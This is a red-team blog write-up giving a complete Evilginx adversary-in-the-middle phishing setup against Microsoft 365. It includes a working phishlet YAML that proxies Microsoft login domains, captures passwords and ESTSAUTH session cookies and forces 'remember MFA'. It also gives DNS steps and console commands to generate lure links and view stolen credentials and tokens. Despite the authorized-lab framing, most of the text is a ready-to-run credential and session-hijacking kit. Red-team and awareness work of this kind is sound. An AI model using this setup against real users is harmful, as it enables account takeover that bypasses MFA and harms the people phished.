---
title: Evilginx Phishing Setup
date: 2026-05-20 00:00:00 +0000
categories: [Writeup, Red-Team]
tags: [phishing, evilginx, redteam]     # TAG names should always be lowercase
toc: false
image: https://cdn.hashnode.com/uploads/covers/688272752e250133c03a93ef/1a55c704-4612-4a0d-9dc2-38924158c06d.png
permalink: /posts/evilginx-setup        
---

In this writeup, I’ll guide you through my approach to setting up an phishing simulation campaign using Evilginx in a controlled lab environment.

The objective? Understand how adversary-in-the-middle phishing frameworks operate during authorized red-team engagements and security awareness exercises.

Before using Evilginx, the following are required:

1.  A public Ubuntu/Debian server that you can access via SSH.
    
2.  A purchased domain name.
    

### Initial Setup

To begin, you need to SSH into your public server:

```shell
ssh -i <private_key> <username>@<public-ip>
```

Once logged in, we need to install Evilginx from GitHub and configure it appropriately:

```shell
git clone https://github.com/kgretzky/evilginx2
```

While remaining in the same directory where Evilginx was installed, use the following command to compile the Evilginx executable:

```shell
go build
```

### Evilginx Phishlets Setup

Navigate to the `phishlets` directory and create a `.yaml` file.

```shell
cd phishlets
```

```shell
touch o365.yaml
```

Below is the content that needs to be pasted into the created phishlets `.yaml` file:

```shell
name: 'o365-mfa'
author: '@faelsfernandes'
min_ver: '2.4.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
  - {phish_sub: 'device.login', orig_sub: 'device.login', domain: 'microsoftonline.com', session: true, is_landing:true}
  - {phish_sub: 'outlook', orig_sub: 'www', domain: 'outlook.com', session: false, is_landing:true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: false, is_landing:true}

sub_filters:
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT','SignInStateCookie',]
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTHLIGHT']   
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'     
login:
  domain: 'login.microsoftonline.com'
  path: '/' 
force_post:
  - path: '/kmsi'
    search: 
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'
  - path: '/common/SAS'
    search: 
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'
```

> Reference Link: https://raw.githubusercontent.com/faelsfernandes/evilginx3-phishlets/main/o365-mfa.yaml

**DNS Configuration**

After purchasing the domain of your choice, you need to modify the DNS configuration in following way:

1.  We will require 4 subdomains - cdn, device.login, login & outlook.
    
2.  The root domain and subdomains domain should point to the IP address of your public server.
    

![](https://cdn.hashnode.com/uploads/covers/688272752e250133c03a93ef/bf5d8f19-525e-48a0-a127-f6700845b389.png align="center")

### Evilginx Phishlet Connection Setup

Start Evilginx by executing the generated executable and assigning the `phishlets` directory to it:

```shell
sudo ./evilginx -p ../phishlets
```

Once the Evilginx console starts, first configure the external IPv4 address to your public server’s IP address:

```shell
evil-ginx> config ipv4 external <public_server_ip>
```

Then, configure the root domain:

```shell
evil-ginx> config domain <domain.com>
```

Then, connect the targeted phishlets to your domain by setting it as hostname of our domain:

```shell
evil-ginx> phishlets hostname o365 <domain.com>
```

After this, the phishlets will remain disabled. Enable it using the following command:

```shell
evil-ginx> phishlets enable o365
```

> After enabling it, all required TLS certificates will be set up automatically.

### Evilginx Lure Setup

It is now time to create a lure for the `o365` phishlet:

```shell
evil-ginx> lures create o365
```

We need to list the available lures:

```shell
evil-ginx> lures
```

Once the target lure ID is identified, we can generate the phishing link:

```shell
evil-ginx> lures get-url <lure_id>

Response(Phishing link will be generated):

https://<domain.com>/random_string
```

> Once the link is generated, it can be used as part of the authorized phishing simulation campaign.

This command can be used to monitor whether any credentials or session tokens have been captured during the phishing campaign:

```shell
evil-ginx> sessions
```

![](https://cdn.hashnode.com/uploads/covers/688272752e250133c03a93ef/17ed6c75-2ebf-44bc-9c6a-bb9b763f5977.png align="center")

To observe the credentials and session tokens associated with a particular target:

```shell
evil-ginx> sessions <id>
```

> The email address, password, and session token associated with the target will be displayed properly in the console.

With this, the setup, configuration, and monitoring process of Evilginx is complete. This lab demonstrates how modern adversary-in-the-middle phishing frameworks operate during authorized red-team engagements and security awareness simulations.
